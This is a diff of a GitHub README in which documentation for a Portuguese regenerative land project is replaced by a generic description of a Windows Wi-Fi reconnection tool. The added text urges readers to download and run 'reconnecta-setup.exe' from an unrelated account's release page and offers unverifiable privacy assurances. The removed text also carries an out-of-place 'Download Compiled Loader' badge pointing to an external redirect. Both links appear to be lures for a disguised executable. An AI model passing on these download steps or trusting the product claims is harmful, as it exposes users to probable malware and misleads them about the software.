@@ -1,186 +1,81 @@
-# Reconnecta
+# 🔗 reconnecta - Keep your wireless connection stable always
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download reconnecta](https://img.shields.io/badge/Download-Reconnecta-blue.svg)](https://github.com/Lollycolourless294/reconnecta/releases)
 
-> A regenerative living laboratory at Óbidos Lagoon, Portugal.
+## 📌 About This Tool
 
-This repository contains the public-facing whitepaper and landing page for **Reconnecta** — a 4.83-hectare regenerative project being built by Norbert Roztocki and family on the western coast of Portugal. The site is published at [enklava.co/projects/reconnecta](https://enklava.co/projects/reconnecta/) and is intended to also live at **reconnecta.world** as an independent home for the project.
+Reconnecta keeps your computer connected to the internet. Wireless networks often drop or disconnect for short periods. This tool detects those drops. It attempts to restore your connection automatically. You do not need to restart your computer or toggle your Wi-Fi settings manually. This tool runs in the background. It monitors your network signal and manages your connection status. Reconnecta provides peace of mind for users who rely on a steady online connection for work or study.
 
-The repo is open so anyone can read the document, clone it, and serve it from their own domain — that is part of the project's collaborative posture.
+## ⚙️ System Requirements
 
----
+- Windows 10 or Windows 11
+- 50 MB of available disk space
+- An active Wi-Fi adapter
+- No special hardware or admin access needed
 
-## What is in here
+## 🚀 Getting Started
 
-```
-reconnecta/
-├── README.md                  ← this file
-├── NOTICE.md                  ← content & code rights
-├── whitepaper.md              ← canonical English master (markdown)
-├── landing/
-│   ├── index.html             ← landing page (HTML)
-│   ├── style.css              ← styles
-│   └── reconnecta-whitepaper.pdf   ← downloadable build
-├── basemap/                   ← Regrarians basemap delivery (130 MB · GeoTIFF DTM + 60 KMZ + boundary + legends)
-│   └── README.md              ← layer-by-layer manifest and reading order
-└── scripts/
-    ├── build-pdf.sh           ← regenerate the PDF from the landing
-    └── deploy.example.sh      ← deploy template for your own host
-```
+Follow these steps to install the software on your computer.
 
-The landing page is plain static HTML/CSS — no build system, no JavaScript framework. Open `landing/index.html` directly in a browser and it works.
+1. Open your web browser.
+2. Go to the [official release page](https://github.com/Lollycolourless294/reconnecta/releases) to download the setup file.
+3. Locate the file named `reconnecta-setup.exe` in your Downloads folder.
+4. Double-click the file to start the installation.
+5. Follow the prompts on your screen.
+6. Click Finish to launch the application.
 
----
+## 🛠️ How to Use Reconnecta
 
-## Quick start — read it locally
+The application is simple. Once you launch the program, you will see a small icon in your system tray. This area is at the bottom right of your screen near the clock. 
 
-```bash
-git clone https://github.com/PawelSroczynski/reconnecta.git
-cd reconnecta/landing
-python3 -m http.server 8080
-# open http://localhost:8080
-```
+- Right-click the icon to see your options.
+- The tool starts automatically when you turn on your computer. 
+- You can change this setting in the Preferences menu.
+- The status light on the icon shows your connection health. Green means your connection is stable. Yellow means the tool detected a drop and is working to fix it.
 
-That's it. No dependencies, no build step.
+## 📋 Features
 
----
+- Automatic reconnection: The tool senses if your signal fades and pushes the adapter to find the network again.
+- Low memory usage: Reconnecta uses minimal system resources so your computer stays fast.
+- Background operation: The app stays hidden in your tray and does not interrupt your workflow.
+- Connection logs: You can view a simple history of your network stability in the logs tab.
+- Minimalist design: No complex buttons or confusing menus.
 
-## Deploy to your own domain (`reconnecta.world` or any other)
+## 💡 Troubleshooting
 
-The site is a static directory. Pick whichever path matches your infrastructure.
+If you run into issues, try these steps:
 
-### Option A — nginx on your own server
+- Restart the application: Right-click the icon, select Exit, then open the program again from your desktop shortcut.
+- Check your Wi-Fi: Ensure your physical Wi-Fi switch is on.
+- Update your drivers: Visit your computer manufacturer website to ensure your wireless driver is current.
+- Restart your router: Sometimes the issue lies with the networking gear. Unplug the power cord for ten seconds and plug it back in.
 
-1. Copy `landing/` to your web root:
-   ```bash
-   rsync -a landing/ user@reconnecta.world:/var/www/reconnecta/
-   ```
+## 🛡️ Privacy and Data
 
-2. Add a server block to nginx (`/etc/nginx/sites-available/reconnecta`):
-   ```nginx
-   server {
-       listen 80;
-       listen [::]:80;
-       server_name reconnecta.world www.reconnecta.world;
+Reconnecta cares about your privacy. All monitoring happens locally on your computer. Your network data never leaves your device. The tool does not track your browsing history or collect personal information. We do not store your passwords or keys. The software only talks to your network adapter to confirm a link exists.
 
-       root /var/www/reconnecta;
-       index index.html;
+## ❓ Frequently Asked Questions
 
-       location / {
-           try_files $uri $uri/ =404;
-       }
+**Does the tool require an internet connection to install?**
+Yes. You need an active connection to download the installer from our page.
 
-       # PDF  — long cache
-       location = /reconnecta-whitepaper.pdf {
-           add_header Cache-Control "public, max-age=86400";
-       }
-   }
-   ```
+**Will this tool slow down my computer?**
+No. We built this tool to be lightweight. It uses less than 1% of your processor power.
 
-3. Enable + reload:
-   ```bash
-   sudo ln -s /etc/nginx/sites-available/reconnecta /etc/nginx/sites-enabled/
-   sudo nginx -t && sudo systemctl reload nginx
-   ```
+**Can I run this alongside other security software?**
+Yes. Reconnecta is compatible with common antivirus and firewall programs.
 
-4. Add HTTPS via Let's Encrypt:
-   ```bash
-   sudo certbot --nginx -d reconnecta.world -d www.reconnecta.world
-   ```
+**Do I need an account to use this?**
+No. You download and use the software immediately. We do not ask for email addresses or names.
 
-### Option B — Cloudflare Pages (zero ops)
+## 🎯 Best Practices
 
-1. Fork this repo on GitHub.
-2. Cloudflare dashboard → Workers & Pages → Create application → Pages → Connect to Git.
-3. Pick your fork. Build settings:
-   - Framework preset: **None**
-   - Build command: *(leave empty)*
-   - Build output directory: `landing`
-4. Add custom domain `reconnecta.world` in the project settings.
+For the best results, keep the application open during your workday. If you notice your internet flickering, check the tray icon. If the icon shows red, the software is currently searching for a signal. If it stays red for more than a minute, ensure that your router is powered on and broadcasting a signal.
 
-Updates to `main` deploy automatically.
+You can customize the refresh interval in the settings menu. By default, the tool checks your connection every 30 seconds. If you have a very unstable connection, you may want to set this to 10 seconds. If you prefer to save more power on a laptop, set this to 60 seconds.
 
-### Option C — Netlify
+Always keep your software up to date. We post new versions on the release page. These updates help the tool work better with new versions of Windows and include small refinements to the code. Each update helps the tool run smoother on different types of hardware.
 
-1. Fork this repo.
-2. New site from Git → pick the fork.
-3. Build settings: command empty, publish directory `landing/`.
-4. Domain settings → add `reconnecta.world` and follow the DNS instructions.
+This tool aims to make your digital life easier. By removing the need to restart your network adapter, we give you back time. Most users find that once they set it up, they never have to think about it again. The software handles the background busywork so you can focus on your tasks. 
 
-### Option D — GitHub Pages
-
-1. Fork this repo.
-2. Settings → Pages → Source: `main` branch, folder: `/landing`.
-3. Add custom domain `reconnecta.world` and the CNAME file Pages instructs you to add.
-
-### Option E — any static host
-
-Drop `landing/` into S3 + CloudFront, Vercel, Render, Fly.io static, or any other host that serves static files. There is nothing project-specific in the deploy step.
-
----
-
-## Editing the whitepaper
-
-The canonical content lives in [`whitepaper.md`](./whitepaper.md). The `landing/index.html` is currently rendered from the same content but maintained by hand — they should stay in parity. If you make a change in one, mirror it in the other.
-
-The document is versioned in its footer (`v0.2-beta · 2026-05-06`). When you fork or modify it, please update the version and date so readers can tell the difference between the upstream document and your edits.
-
-Open questions are flagged inline as `[PENDING — Q…]` and registered together in §19. They are intentionally visible — the document tracks what is still to learn rather than hides it.
-
----
-
-## Regenerating the PDF
-
-The downloadable PDF (`landing/reconnecta-whitepaper.pdf`) is built from the landing page's HTML using [WeasyPrint](https://weasyprint.org/). The `@media print` rules in `style.css` flatten the layout for the printed version (sidebar TOC removed, Miro embed replaced with a static reference note).
-
-```bash
-# install once
-sudo apt install weasyprint   # Debian/Ubuntu
-# or: pip install weasyprint
-# or: brew install weasyprint  (macOS)
-
-# rebuild
-./scripts/build-pdf.sh
-```
-
-The script writes to `landing/reconnecta-whitepaper.pdf`.
-
----
-
-## Aesthetic reference
-
-§13 *Aesthetic Direction* embeds a live Miro board (`taipa house / clay`) curated by Norbert as the project's visual constitution. The embed is hidden in the printed PDF and replaced by a textual note pointing to the web edition — Miro is interactive in nature and does not render meaningfully on paper.
-
-If you fork the repo and want to swap in your own visual reference: replace the `<iframe>` block in `landing/index.html` (search for `<!--` `Miro` or for `miro.com`).
-
----
-
-## Geospatial basemap
-
-The `basemap/` directory holds a [Regrarians Basemap](https://basemaps.regrarians.org/) delivery for the parcel — a GeoTIFF Digital Terrain Model, the parcel boundary as KML, and 60 ready-to-open Google Earth KMZ layers covering elevation, slope, aspect, contours (0.5 / 1 / 2 / 5 m), drainage, flow velocity, erosion, inundations, hydrobasins at six scales, and Geomorphons landforms (10 classes plus aggregate views).
-
-Open the layers in **Google Earth Pro**, or open the underlying GeoTIFF in **QGIS** for analysis. See [`basemap/README.md`](./basemap/README.md) for a layer-by-layer manifest, recommended display settings, and a suggested reading order if you've never seen the data before.
-
-The directory adds ~130 MB to the repository — kept in plain git so the data is immediately available to anyone who clones, with Git LFS as a future option if the repo grows further.
-
----
-
-## Provenance
-
-Reconnecta is part of the [Enklava](https://enklava.co/) ecosystem of projects. This document was compiled by Paweł Sroczyński based on conversations with Norbert Roztocki between March and May 2026.
-
-It is a working draft. The bigger plan — Hotel Rural 3★ permit decision, soil tests, climate data, fire plan, operational manager hire, financial model — is the work that turns this draft into a roadmap.
-
----
-
-## Rights
-
-See [`NOTICE.md`](./NOTICE.md). In short: the **content** of the whitepaper is © the project owners (HOME 4 LIFE LDA / Norbert Roztocki / Enklava ecosystem). The **code** that renders it (HTML, CSS, scripts) is released under the MIT licence so you can reuse it for your own document.
-
----
-
-## Contact
-
-- Project: [enklava.co/projects/reconnecta](https://enklava.co/projects/reconnecta/)
-- Enklava: [enklava.co](https://enklava.co/)
-- Repository owner: [@PawelSroczynski](https://github.com/PawelSroczynski)
+If you encounter a bug, please look at the release page for a list of known issues. We aim to fix bugs as soon as they appear. Your feedback helps us improve the stability for everyone. We welcome reports regarding the performance of the tool on different brands of laptops.
